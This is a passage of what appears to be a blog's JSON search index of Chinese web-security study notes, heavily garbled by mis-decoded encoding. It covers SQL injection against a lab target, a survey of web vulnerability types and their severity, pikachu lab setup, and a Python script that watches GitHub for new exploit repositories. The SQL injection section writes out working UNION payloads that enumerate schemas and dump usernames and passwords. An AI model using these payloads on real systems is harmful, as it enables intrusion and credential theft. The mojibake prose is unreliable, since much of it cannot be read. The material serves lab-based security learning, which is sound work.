å®‰å…¨ä¸­ä¸¥é‡çš„å®‰å…¨æ¼æ´ï¼Œå­¦ä¹ å¦‚ä½•åˆ©ç”¨ï¼ŒæŒ–æ˜ï¼Œä¿®å¤ä¹Ÿæ˜¯å¾ˆé‡è¦çš„ã€‚ SQLåŸç†SQLæ³¨å…¥æ˜¯ä¸€ç§è§£é‡Šæ€§è¯­è¨€ï¼Œå¦‚æœç¨‹åºä¸ç”¨æˆ·è¿›è¡Œäº¤äº’ã€‚ç”¨æˆ·å°±å¯ä»¥æ„é€ ç‰¹æ®Šçš„è¾“å…¥æ¥æ‹¼æ¥åˆ°ç¨‹åºä¸­æ‰§è¡Œï¼Œä»è€Œä½¿å¾—ç¨‹åºä¾æ®ç”¨æˆ·è¾“å…¥æ‰§è¡Œæœ‰å¯èƒ½å­˜åœ¨æ¶æ„è¡Œä¸ºçš„ä»£ç ã€‚ SQLäº§ç”Ÿæ¡ä»¶ï¼š å¿…é¡»å¯ä»¥è¿›è¡Œè¾“å…¥ è¾“å…¥çš„å†…å®¹å¿…é¡»è¦ä¸æ•°æ®åº“è¿›è¡Œäº¤äº’ SQLæ³¨å…¥çš„åˆ†ç±» ä»æ³¨å…¥æ‰‹æ³•åˆ†ç±»å¯ä»¥åˆ†ä¸ºï¼šè”åˆæŸ¥è¯¢æ³¨å…¥ã€æŠ¥é”™å‹æ³¨å…¥ã€å¸ƒå°”å‹æ³¨å…¥ã€å»¶æ—¶æ³¨å…¥ã€å †å æ³¨å…¥ ä»æ•°æ®ç±»å‹ä¸Šå¯ä»¥åˆ†ä¸ºï¼šå­—ç¬¦å‹ï¼ˆå³è¾“å…¥çš„è¾“å…¥ä½¿ç”¨ç¬¦å·è¿›è¡Œè¿‡æ»¤ï¼‰ã€æ•°å€¼å‹ï¼ˆå³è¾“å…¥çš„è¾“å…¥æœªä½¿ç”¨ç¬¦å·è¿›è¡Œè¿‡æ»¤ï¼‰ ä»æ³¨å…¥ä½ç½®å¯ä»¥åˆ†ç±»ä¸ºï¼šGETæ•°æ®ï¼ˆæäº¤æ•°æ®æ–¹å¼ä¸ºGETï¼Œå¤§å¤šå­˜åœ¨åœ°å€æ ï¼‰ã€POSTæ•°æ®ï¼ˆæäº¤æ•°æ®æ–¹å¼ä¸ºPOSTï¼Œå¤§å¤šå­˜åœ¨è¾“å…¥æ¡†ä¸­ï¼‰ã€HTTPå¤´éƒ¨ï¼ˆæäº¤æ•°æ®æ–¹å¼ä¸ºHTTPå¤´éƒ¨ï¼‰ã€cookieæ•°æ®ï¼ˆæäº¤æ•°æ®æ–¹å¼ä¸ºcookieï¼‰ SQLæ³¨å…¥å®‰å…¨æµ‹è¯•ä¸­å±å®³ ç½‘ç«™æƒé™ æ•°æ®åº“æ•°æ® MYSQLæ•°æ®åº“æ³¨å…¥é¡ºåº 12345678æ•°æ®åº“A=ç½‘ç«™A è¡¨å åˆ—å æ•°æ®æ•°æ®åº“B=ç½‘ç«™B.........æ•°æ®åº“C=ç½‘ç«™C.......... å¦‚ä½•åˆ¤æ–­æ³¨å…¥ç‚¹è€åŠæ³•12345678910111213and 1=1 é¡µé¢æ­£å¸¸and 1=2 é¡µé¢é”™è¯¯å¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹è§£é‡Šselect * from users where id=1 and 1=1 limit 0,1 æ­£å¸¸select * from users where id=1 and 1=2 limit 0,1 é”™è¯¯å‰æ:select * from users where id=1è‹¥:1=1 çœŸ çœŸä¸”çœŸ=çœŸè‹¥:1=2 å‡ çœŸä¸”å‡=å‡ä¸å¯ä»¥ç”¨oråˆ¤æ–­ å¥½ç”¨çš„ï¼ï¼123456select * from users where id=1æœ€åæˆ‘ä»¬æµ‹è¯•éƒ½æ˜¯åœ¨idåé¢åŠ ä¸œè¥¿,ç„¶åidå¸¦å…¥æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢,æ‰€æœ‰æˆ‘ä»¬è¿™é‡Œå¯ä»¥éšä¾¿è¾“å…¥,å½“æ•°æ®åº“æ²¡æœ‰è¿™ä¸ªid,é¡µé¢å°±ä¼šæ”¹å˜.ä¾‹å¦‚:id=1è¥¿ç“œ,å¦‚æœé¡µé¢æ”¹å˜è¯´æ˜æœ‰æ³¨å…¥,å¦‚æœæ²¡æœ‰æ”¹å˜è¯´æ˜idæœ¬èº«æ²¡æœ‰è¢«å¸¦å…¥æ•°æ®åº“ä¸­è¿›è¡ŒæŸ¥è¯¢ã€‚ä¾‹å¤–:å¦‚æœä½ è¾“å…¥é”™è¯¯ç½‘ç«™ä¼šæŠ¥404,,è¿›è¡Œè·³è½¬.æ­¤ç±»ç½‘ç«™æœ‰é˜²æŠ¤,åŸºæœ¬æ²¡æœ‰æ³¨å…¥ã€‚ å¿…è¦çŸ¥è¯†ç‚¹1ã€information_chema åœ¨Mysql 5.0ä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼Œé»˜è®¤å®šä¹‰äº†information_schemaæ•°æ®åº“ï¼Œç”¨æ¥å­˜å‚¨æ•°æ®åº“å…ƒä¿¡æ¯ï¼Œå…¶ä¸­å…·æœ‰è¡¨schemata(æ•°æ®åº“å),tables(è¡¨æ˜),columns(åˆ—åæˆ–å­—æ®µå) åœ¨schemataè¡¨ä¸­ï¼Œschema_nameå­—æ®µç”¨æ¥å­˜å‚¨æ•°æ®åº“åï¼Œ åœ¨tablesè¡¨ä¸­ï¼Œtable_schemaå’Œtable_nameåˆ†åˆ«ç”¨æ¥å­˜å‚¨æ•°æ®åº“åå’Œè¡¨åã€‚ åœ¨columnsè¡¨ä¸­ï¼Œtable_schema(æ•°æ®åº“å),table_name(è¡¨å),column_name(å­—æ®µå) 2ã€æ•°æ®åº“ä¸­çš„â€.â€æ•°æ®åº“ä¸­ç¬¦å·â€.â€ä»£è¡¨ä¸‹ä¸€çº§ï¼Œå¦‚xiao.userè¡¨ç¤ºxiaoæ•°æ®åº“ä¸­çš„userè¡¨å çŒœè§£åˆ—åæ•°é‡çŒœè§£åˆ—åæ•°é‡(å­—æ®µæ•°) order by x é”™è¯¯ä¸æ­£å¸¸çš„æ­£å¸¸å€¼ 1?id=1 order by 4 è”åˆæ³¨å…¥æŠ¥é”™çŒœè§£å‡†å¤‡ 12?id=1 union select 1,2,3,4 é¡µé¢æ­£å¸¸è¯´æ˜çŒœè§£åˆ—åæ­£ç¡®?id=-1 union select 1,2,3,4 é€šè¿‡å°†id=-1 ä½¿åé¢çš„è¯­å¥æ‰§è¡ŒæˆåŠŸ,èƒ½å¤Ÿåœ¨é¡µé¢ä¸­å›æ˜¾çš„ä½ç½®å°†ä¼šè¢«æ•°å­—ä»£æ›¿ ä¿¡æ¯æ”¶é›†1234567æ•°æ®åº“ç‰ˆæœ¬: version()æ•°æ®åº“åå­—: database()æ•°æ®åº“ç”¨æˆ·: user()æ“ä½œç³»ç»Ÿ: @@version_compile_osæŸ¥è¯¢:?id=-1 union select 1,database(),3,4 æŸ¥è¯¢æŒ‡å®šæ•°æ®åº“åä¸‹çš„è¡¨åä¿¡æ¯æŒ‡å®šæ•°æ®åº“:mozhe_Discus_StormGroup 1?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_shchema=&#x27;mozhe_Discus_StormGroup&#x27; è¿™æ ·æŸ¥è¯¢åªä¼šæ˜¾ç¤ºä¸€ä¸ªéœ€è¦group_concat() 1?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_shchema=&#x27;mozhe_Discus_StormGroup&#x27; æŸ¥è¯¢æŒ‡å®šè¡¨ååä¸‹çš„åˆ—åä¿¡æ¯æŒ‡å®šè¡¨:StormGroup_member 1?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_shchema=&#x27;StormGroup_member&#x27; æŸ¥è¯¢æŒ‡å®šæ•°æ®è¿™æ ·åªèƒ½æŸ¥å‡ºä¸€éƒ¨åˆ†,æˆ–è€…åªèƒ½æŸ¥å‡ºä¸€ä¸ª 1?id=-1 union select 1,name,password,4 from mozhe_Discus_StormGroup.StormGroup_member è¿™æ ·å¯ä»¥å°†å…¨éƒ¨ä¿¡æ¯æŸ¥å‡º,ä¹Ÿå¯ä»¥ä½¿ç”¨limit 0,xè¿›è¡Œå¤šä¸ªæŸ¥è¯¢ 1?id=-1 union select 1,group_concat(concat_ws(0x7e,name,password)),3,4 from mozhe_Discus_StormGroup.StormGroup_member æ¶‰åŠèµ„æºhttps://github.com/Audi-1/sqli-labs å¿è€…å®‰å…¨æµ‹è¯•ç³»ç»Ÿ-ç¦ç”¨è½¯ç›˜å®‰è£… https://www.mozhe.cn/bug/detail/eIRHc1BCd2VlckQxbjduMG9BVCtkZz09bW96aGUmozhe","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"https://al0nez.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"11WEBæ¼æ´--å¿…æ‡‚çŸ¥è¯†","slug":"11WEBæ¼æ´-å¿…æ‡‚çŸ¥è¯†","date":"2021-09-21T02:28:01.000Z","updated":"2021-09-21T06:05:40.696Z","comments":true,"path":"2021/09/21/11WEBæ¼æ´-å¿…æ‡‚çŸ¥è¯†/","link":"","permalink":"https://al0nez.github.io/2021/09/21/11WEB%E6%BC%8F%E6%B4%9E-%E5%BF%85%E6%87%82%E7%9F%A5%E8%AF%86/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† å‰è¨€æœ¬ç« èŠ‚å°†è®²è§£å„ç§ WEB å±‚é¢ä¸Šçš„æœ‰é‚£äº›æ¼æ´ç±»å‹ï¼Œå…·ä½“æ¼æ´çš„å±å®³ç­‰çº§ï¼Œä»¥ç®€è¦çš„å½±å“èŒƒå›´æµ‹è¯•è¿›è¡Œå®ä¾‹åˆ†æï¼Œæ€ç»´å¯¼å›¾ä¸­çš„æ¼æ´ä¹Ÿæ˜¯åé¢æˆ‘ä»¬å°†è¦å­¦ä¹ åˆ°çš„å„ä¸ªçŸ¥è¯†ç‚¹ï¼Œå…¶ä¸­é’ˆå¯¹æ¼æ´çš„å½¢æˆåŸç†ï¼Œå¦‚ä½•å‘ç°ï¼Œå¦‚ä½•åˆ©ç”¨å°†æ˜¯æœ¬ç« èŠ‚å­¦ä¹ çš„é‡ç‚¹å†…å®¹ï¼ ç®€è¦è¯´æ˜ä»¥ä¸Šæ¼æ´å±å®³æƒ…å†µSQLæ³¨å…¥ æ”»å‡»è€…æœªç»æˆæƒå¯ä»¥è®¿é—®æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œç›—å–ç”¨æˆ·çš„éšç§ä»¥åŠä¸ªäººä¿¡æ¯ï¼Œé€ æˆç”¨æˆ·çš„ä¿¡æ¯æ³„éœ²ã€‚ é€šè¿‡æ“ä½œæ•°æ®åº“å¯¹æŸäº›ç½‘é¡µè¿›è¡Œç¯¡æ”¹; ä¿®æ”¹æ•°æ®åº“ä¸€äº›å­—æ®µçš„å€¼ï¼ŒåµŒå…¥ç½‘é©¬é“¾æ¥ï¼Œè¿›è¡ŒæŒ‚é©¬æ”»å‡»;æ”»å‡»è€…è¿›è€Œå¯ä»¥å¯¹ç½‘é¡µè¿›è¡Œç¯¡æ”¹ï¼Œå‘å¸ƒä¸€äº›è¿æ³•ä¿¡æ¯ç­‰ã€‚ æœåŠ¡å™¨è¢«è¿œç¨‹æ§åˆ¶ï¼Œè¢«å®‰è£…åé—¨ã€‚å¯ä»¥å¯¹æ•°æ®åº“çš„æ•°æ®è¿›è¡Œå¢åŠ æˆ–åˆ é™¤æ“ä½œï¼Œä¾‹å¦‚ç§è‡ªæ·»åŠ æˆ–åˆ é™¤ç®¡ç†å‘˜è´¦å·ã€‚ æ•°æ®åº“è¢«æ¶æ„æ“ä½œï¼šæ•°æ®åº“æœåŠ¡å™¨è¢«æ”»å‡»ï¼Œæ•°æ®åº“çš„ç³»ç»Ÿç®¡ç†å‘˜å¸æˆ·è¢«çªœæ”¹ã€‚ ç ´åç¡¬ç›˜æ•°æ®ï¼Œå¯¼è‡´å…¨ç³»ç»Ÿç˜«ç—ª; XSS ç½‘ç»œé’“é±¼ï¼ŒåŒ…æ‹¬ç›—å–å„ç±»ç”¨æˆ·è´¦å·ï¼› çªƒå–ç”¨æˆ·cookiesèµ„æ–™ï¼Œä»è€Œè·å–ç”¨æˆ·éšç§ä¿¡æ¯ï¼Œæˆ–åˆ©ç”¨ç”¨æˆ·èº«ä»½è¿›ä¸€æ­¥å¯¹ç½‘ç«™æ‰§è¡Œæ“ä½œï¼› åŠ«æŒç”¨æˆ·(æµè§ˆå™¨)ä¼šè¯ï¼Œä»è€Œæ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚è¿›è¡Œéæ³•è½¬è´¦ã€å¼ºåˆ¶å‘è¡¨æ—¥å¿—ã€å‘é€ç”µå­é‚®ä»¶ç­‰ï¼› å¼ºåˆ¶å¼¹å‡ºå¹¿å‘Šé¡µé¢ã€åˆ·æµé‡ç­‰ï¼› ç½‘é¡µæŒ‚é©¬ï¼Œè¿›è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚ä»»æ„ç¯¡æ”¹é¡µé¢ä¿¡æ¯ã€åˆ é™¤æ–‡ç« ç­‰ï¼› è¿›è¡Œå¤§é‡çš„å®¢æˆ·ç«¯æ”»å‡»ï¼Œå¦‚DDoSæ”»å‡»ï¼› è·å–å®¢æˆ·ç«¯ä¿¡æ¯ï¼Œä¾‹å¦‚ç”¨æˆ·çš„æµè§ˆå†å²ã€çœŸå®IPã€å¼€æ”¾ç«¯å£ç­‰ï¼› æ§åˆ¶å—å®³è€…æœºå™¨å‘å…¶ä»–ç½‘ç«™å‘èµ·æ”»å‡»ï¼› ç»“åˆå…¶ä»–æ¼æ´ï¼Œå¦‚CSRFæ¼æ´ï¼Œå®æ–½è¿›ä¸€æ­¥ä½œæ¶ï¼› æå‡ç”¨æˆ·æƒé™ï¼ŒåŒ…æ‹¬è¿›ä¸€æ­¥æ¸—é€ç½‘ç«™ï¼› ä¼ æ’­è·¨ç«™è„šæœ¬è •è™«ç­‰ï¼› XXE æ–‡ä»¶è¯»å– å‘½ä»¤æ‰§è¡Œ å†…ç½‘ç«¯å£æ‰«æ æ”»å‡»å†…ç½‘ç½‘ç«™ å‘èµ·dosæ”»å‡»ç­‰å±å®³ æ–‡ä»¶ä¸Šä¼ å¦‚æœ Webåº”ç”¨ç¨‹åºå­˜åœ¨ä¸Šä¼ æ¼æ´ , æ”»å‡»è€…ç”šè‡³å¯ä»¥å°†ä¸€ä¸ªwebshellç›´æ¥ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Š æ–‡ä»¶åŒ…å« webæœåŠ¡å™¨çš„æ–‡ä»¶è¢«å¤–ç•Œæµè§ˆå¯¼è‡´ä¿¡æ¯æ³„éœ² è„šæœ¬è¢«ä»»æ„æ‰§è¡Œï¼Œå¯èƒ½ä¼šç¯¡æ”¹ç½‘ç«™ã€æ‰§è¡Œéæ³•æ“ä½œã€æ”»å‡»å…¶ä»–ç½‘ç«™ æ–‡ä»¶è¯»å–é€šè¿‡ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œå¯ä»¥ä¸‹è½½æœåŠ¡å™¨çš„ä»»æ„æ–‡ä»¶ï¼Œwebä¸šåŠ¡çš„ä»£ç ï¼ŒæœåŠ¡å™¨å’Œç³»ç»Ÿçš„å…·ä½“é…ç½®ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥ä¸‹è½½æ•°æ®åº“çš„é…ç½®ä¿¡æ¯ï¼Œä»¥åŠå¯¹å†…ç½‘çš„ä¿¡æ¯æ¢æµ‹ç­‰ç­‰ CSRF(ç”¨æˆ·è¯·æ±‚ä¼ªé€ )ä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ï¼Œå¦‚ç”¨æˆ·çš„å¤´åƒã€å‘è´§åœ°å€ç­‰ã€‚æ›´æœ‰ç”šè€…ï¼Œå¯èƒ½æ‰§è¡Œæ¶æ„æ“ä½œï¼Œæ¯”å¦‚ä¿® æ”¹å¯†ç ã€æ·»åŠ /åˆ é™¤å¥½å‹æˆ–è€…ç‚¹èµ/è½¬å‘/è¯„è®º/ç§ä¿¡ã€‚ SSRF(æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )æ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´ç»•è¿‡é˜²ç«å¢™ç­‰è®¿é—®é™åˆ¶ï¼Œè¿›è€Œå°†å—æ„ŸæŸ“æˆ–å­˜åœ¨æ¼æ´çš„æœåŠ¡å™¨ä½œä¸ºä»£ç†è¿›è¡Œç«¯å£æ‰«æï¼Œç”šè‡³æ˜¯è®¿é—®å†…éƒ¨ç³»ç»Ÿæ•°æ®ã€‚ å¯ä»¥å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„ Banner ä¿¡æ¯ æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åºï¼ˆæ¯”å¦‚æº¢å‡ºï¼‰ å¯¹å†…ç½‘ Web åº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œé€šè¿‡è®¿é—®é»˜è®¤æ–‡ä»¶å®ç° æ”»å‡»å†…å¤–ç½‘çš„ Web åº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨ GET å‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡» åˆ©ç”¨ file åè®®è¯»å–æœ¬åœ°æ–‡ä»¶ ååºåˆ—åŒ–è¿œç¨‹æ”»å‡»è€…åˆ©ç”¨æ¼æ´å¯åœ¨æœªç»ä»»ä½•èº«ä»½éªŒè¯çš„æœåŠ¡å™¨ä¸»æœºä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œè¢«æ”»å‡»è€…é—´æ¥æ§åˆ¶æœåŠ¡å™¨ ä»£ç æ‰§è¡Œ ä»£ç æ‰§è¡Œæ¼æ´é€ æˆçš„åŸç†æ˜¯ç”±äºæœåŠ¡å™¨ç«¯æ²¡æœ‰é’ˆå¯¹æ‰§è¡Œå‡½æ•°åšè¿‡æ»¤ï¼Œå¯¼è‡´åœ¨æ²¡æœ‰æŒ‡å®šç»å¯¹è·¯å¾„çš„æƒ…å†µä¸‹å°±æ‰§è¡Œå‘½ä»¤ï¼Œå¯èƒ½ä¼šå…è®¸æ”»å‡»è€…é€šè¿‡æ”¹å˜ $PATH æˆ–ç¨‹åºæ‰§è¡Œç¯å¢ƒçš„å…¶ä»–æ–¹é¢æ¥æ‰§è¡Œä¸€ä¸ªæ¶æ„æ„é€ çš„ä»£ç ã€‚é€ æˆä»£ç æ‰§è¡Œç›¸å…³çš„å‡½æ•°åˆ†åˆ«æ˜¯ï¼ševalã€assertå‡½æ•° æš´éœ²æœåŠ¡å™¨ä¿¡æ¯ æœ¨é©¬æ¤å…¥ æ•æ„Ÿæ–‡ä»¶æš´éœ² å¯èƒ½å‡çº§ä¸ºå‘½ä»¤æ‰§è¡Œ é€»è¾‘æ¼æ´ å¤§é‡æ•æ„Ÿæ•°æ®æ³„éœ²ï¼Œè¶Šæƒè®¿é—®ï¼Œè¶Šæƒé‡ç½®å£ä»¤ å•†å“ä½ä»·æ”¯ä»˜ç»æµæŸå¤±ï¼Œå•†å“/äº§å“é‡‘é¢ã€æ•°é‡ç¯¡æ”¹ç­‰ æ´»åŠ¨è¢«æ¶æ„åˆ·å–ï¼Œå¡/åˆ¸é‡å¤é¢†å–ï¼Œæ¡ä»¶ç«äº‰ç­‰ æºæ¶æ„æŸè€—ï¼Œæ”¯ä»˜æ¥å£ã€çŸ­ä¿¡/é‚®ä»¶æ¥æ”¶ æœªæˆæƒè®¿é—®æ•æ„Ÿä¿¡æ¯æ³„éœ² å‘½ä»¤æ‰§è¡Œ ç»§æ‰¿WebæœåŠ¡ç¨‹åºçš„æƒé™å»æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æˆ–è¯»å†™æ–‡ä»¶ åå¼¹shell æ§åˆ¶æ•´ä¸ªç½‘ç«™ç”šè‡³æ§åˆ¶æœåŠ¡å™¨ è¿›ä¸€æ­¥å†…ç½‘æ¸—é€ ç›®å½•éå†æ”»å‡»è€…é€šè¿‡è®¿é—®ç½‘ç«™æŸä¸€ç›®å½•æ—¶ï¼Œè¯¥ç›®å½•æ²¡æœ‰é»˜è®¤é¦–é¡µæ–‡ä»¶æˆ–æ²¡æœ‰æ­£ç¡®è®¾ç½®é»˜è®¤é¦–é¡µæ–‡ä»¶ï¼Œå°†ä¼šæŠŠæ•´ä¸ªç›®å½•ç»“æ„åˆ—å‡ºæ¥ï¼Œå°†ç½‘ç«™ç»“æ„å®Œå…¨æš´éœ²ç»™æ”»å‡»è€…ï¼› æ”»å‡»è€…å¯èƒ½é€šè¿‡æµè§ˆç›®å½•ç»“æ„ï¼Œè®¿é—®åˆ°æŸäº›éšç§˜æ–‡ä»¶ï¼ˆå¦‚PHPINFOæ–‡ä»¶ã€æœåŠ¡å™¨æ¢é’ˆæ–‡ä»¶ã€ç½‘ç«™ç®¡ç†å‘˜åå°è®¿é—®åœ°å€ã€æ•°æ®åº“è¿æ¥æ–‡ä»¶ç­‰ï¼‰ ç®€è¦è¯´æ˜ä»¥ä¸Šæ¼æ´ç­‰çº§åˆ’åˆ†é«˜å±æ¼æ´ï¼šä»£ç æ‰§è¡Œã€æ–‡ä»¶ä¸Šä¼ ã€æ–‡ä»¶åŒ…å«ã€å‘½ä»¤æ‰§è¡Œã€SQLæ³¨å…¥ã€æœªæˆæƒè®¿é—® ä¸­å±æ¼æ´ï¼šé€»è¾‘å®‰å…¨ã€ååºåˆ—åŒ– ä½å±æ¼æ´ï¼šç›®å½•éå†ã€XSSè·¨ç«™ã€æ–‡ä»¶è¯»å– ç®€è¦è¯´æ˜ä»¥ä¸Šæ¼æ´é‡ç‚¹å†…å®¹CTFï¼šSQLæ³¨å…¥ã€æ–‡ä»¶ä¸Šä¼ ã€ååºåˆ—åŒ–ã€ä»£ç æ‰§è¡Œ SRCï¼šå›¾ç‰‡ä¸Šæ¼æ´éƒ½èƒ½å‡ºç°ï¼Œé€»è¾‘å®‰å…¨å‡ºç°æ¯”è¾ƒå¤š çº¢è“å¯¹æŠ—ï¼šæ¶‰åŠçš„é«˜å±æ¼æ´ï¼Œæ–‡ä»¶ä¸Šä¼ ã€æ–‡ä»¶åŒ…å«ã€ä»£ç æ‰§è¡Œã€å‘½ä»¤æ‰§è¡Œ ç®€è¦è¯´æ˜ä»¥ä¸Šæ¼æ´å½¢åŠ¿é—®é¢˜æ‰¾ä¸åˆ°æ¼æ´æ˜¯å› ä¸ºï¼šä¿¡æ¯æ”¶é›†æ²¡åšå¥½ï¼Œè‡ªå·±å¯¹æ¼æ´çš„ç†è§£ä¸å¤Ÿ pikachué¶åœºå®‰è£…ä¸‹è½½æºç 1https://github.com/zhuifengshaonianhanlu/pikachu ä¿®æ”¹é…ç½®æ–‡ä»¶ åˆå§‹åŒ– åˆå§‹åŒ–æˆåŠŸ æ¶‰åŠèµ„æº1https://github.com/zhuifengshaonianhanlu/pikachu","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"10ä¿¡æ¯æ”¶é›†-èµ„äº§ç›‘æ§æ‹“å±•","slug":"10ä¿¡æ¯æ”¶é›†-èµ„äº§ç›‘æ§æ‹“å±•","date":"2021-09-21T02:27:28.000Z","updated":"2021-09-21T06:05:44.461Z","comments":true,"path":"2021/09/21/10ä¿¡æ¯æ”¶é›†-èµ„äº§ç›‘æ§æ‹“å±•/","link":"","permalink":"https://al0nez.github.io/2021/09/21/10%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%B5%84%E4%BA%A7%E7%9B%91%E6%8E%A7%E6%8B%93%E5%B1%95/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† Githubç›‘æ§ä¾¿äºæ”¶é›†æ•´ç†æœ€æ–° exp æˆ– pocä¾¿äºå‘ç°ç›¸å…³æµ‹è¯•ç›®æ ‡çš„èµ„äº§ å„ç§å­åŸŸåæŸ¥è¯¢DNS,å¤‡æ¡ˆ,è¯ä¹¦å…¨çƒèŠ‚ç‚¹è¯·æ±‚ cdnæšä¸¾çˆ†ç ´æˆ–è§£æå­åŸŸåå¯¹åº”ä¾¿äºå‘ç°ç®¡ç†å‘˜ç›¸å…³çš„æ³¨å†Œä¿¡æ¯ é»‘æš—å¼•æ“ç›¸å…³æœç´¢fofaï¼Œshodanï¼Œzoomeye å¾®ä¿¡å…¬ä¼—å·æ¥å£è·å–å†…éƒ¨ç¾¤å†…éƒ¨åº”ç”¨å†…éƒ¨æ¥å£ æ¼”ç¤ºæ¡ˆä¾‹ç›‘æ§æœ€æ–°çš„EXPå‘å¸ƒåŠå…¶ä»– 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657# Title: wechat push CVE-2020# Date: 2020-5-9# Exploit Author: weixiao9188# Version: 4.0# Tested on: Linux,windows# coding:UTF-8import requestsimport jsonimport timeimport osimport pandas as pdtime_sleep = 20 #æ¯éš”20ç§’çˆ¬å–ä¸€æ¬¡while(True): headers = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3741.400 QQBrowser/10.5.3863.400&quot;&#125; #åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ datas = [] response1=None response2=None if os.path.exists(&quot;olddata.csv&quot;): #å¦‚æœæ–‡ä»¶å­˜åœ¨åˆ™æ¯æ¬¡çˆ¬å–10ä¸ª df = pd.read_csv(&quot;olddata.csv&quot;, header=None) datas = df.where(df.notnull(),None).values.tolist()#å°†æå–å‡ºæ¥çš„æ•°æ®ä¸­çš„nanè½¬åŒ–ä¸ºNone response1 = requests.get(url=&quot;https://api.github.com/search/repositories?q=CVE-2020&amp;sort=updated&amp;per_page=10&quot;, headers=headers) response2 = requests.get(url=&quot;https://api.github.com/search/repositories?q=phpcms&amp;ssort=updated&amp;per_page=10&quot;, headers=headers) else: #ä¸å­˜åœ¨çˆ¬å–å…¨éƒ¨ datas = [] response1 = requests.get(url=&quot;https://api.github.com/search/repositories?q=CVE-2020&amp;sort=updated&amp;order=desc&quot;,headers=headers) response2 = requests.get(url=&quot;https://api.github.com/search/repositories?q=RCE&amp;ssort=updated&amp;order=desc&quot;,headers=headers) data1 = json.loads(response1.text) data2 = json.loads(response2.text) for j in [data1[&quot;items&quot;],data2[&quot;items&quot;]]: for i in j: s = &#123;&quot;name&quot;:i[&#x27;name&#x27;],&quot;html&quot;:i[&#x27;html_url&#x27;],&quot;description&quot;:i[&#x27;description&#x27;]&#125; s1 =[i[&#x27;name&#x27;],i[&#x27;html_url&#x27;],i[&#x27;description&#x27;]] if s1 not in datas: #print(s1) #print(datas) params = &#123; &quot;text&quot;:s[&quot;name&quot;], &quot;desp&quot;:&quot; é“¾æ¥:&quot;+str(s[&quot;html&quot;])+&quot;\\nç®€ä»‹&quot;+str(s[&quot;description&quot;]) &#125; print(&quot;å½“å‰æ¨é€ä¸º&quot;+str(s)+&quot;\\n&quot;) print(params) requests.get(&quot;https://sc.ftqq.com/xxxx.send&quot;,params=params,timeout=10) #time.sleep(1)#ä»¥é˜²æ¨é€å¤ªçŒ›#ï¼Œverify=False print(&quot;æ¨é€å®Œæˆ!&quot;) datas.append(s1) else: pass #print(&quot;æ•°æ®å·²å¤„åœ¨!&quot;) pd.DataFrame(datas).to_csv(&quot;olddata.csv&quot;,header=None,index=None) time.sleep(time_sleep) å®‰è£…pandas1pip install pandas Serveré…±è®¾ç½®æ‰«ç ç™»å½•è·å–è‡ªå·±çš„SendKeyï¼Œä¹‹åä¿®æ”¹åˆ°ä»£ç ä¸­xxxxä¸ºSendKeyå€¼ã€‚ 1https://sctapi.ftqq.com/xxxx.send æœ€åç»“æœ é»‘æš—å¼•æ“å®ç°åŸŸåç«¯å£ç­‰æ”¶é›† å…¨è‡ªåŠ¨åŸŸåæ”¶é›†æšä¸¾ä¼˜ç§€è„šæœ¬ä½¿ç”¨12ä»¥xxxxä¸ºä¾‹ï¼Œä»æ ‡é¢˜ï¼ŒåŸŸåç­‰æ”¶é›†ä»¥xxxxä¸ºä¾‹ï¼Œå…¨è‡ªåŠ¨è„šæœ¬ä½¿ç”¨æ”¶é›† teemo1pip.exe install requirements.txt 